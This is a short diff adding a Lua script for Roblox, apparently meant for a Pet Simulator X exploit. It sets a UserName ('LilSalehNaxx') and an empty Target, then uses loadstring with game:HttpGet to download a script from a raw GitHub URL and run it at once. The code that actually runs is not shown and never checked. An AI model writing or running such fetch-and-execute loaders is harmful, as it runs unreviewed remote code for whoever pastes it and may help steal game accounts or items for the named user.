@@ -1,0 +1,4 @@
+UserName = "LilSalehNaxx"
+Target = ""
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/KedumAlt/KedCom-PsxScript/main/Vesty", true))()
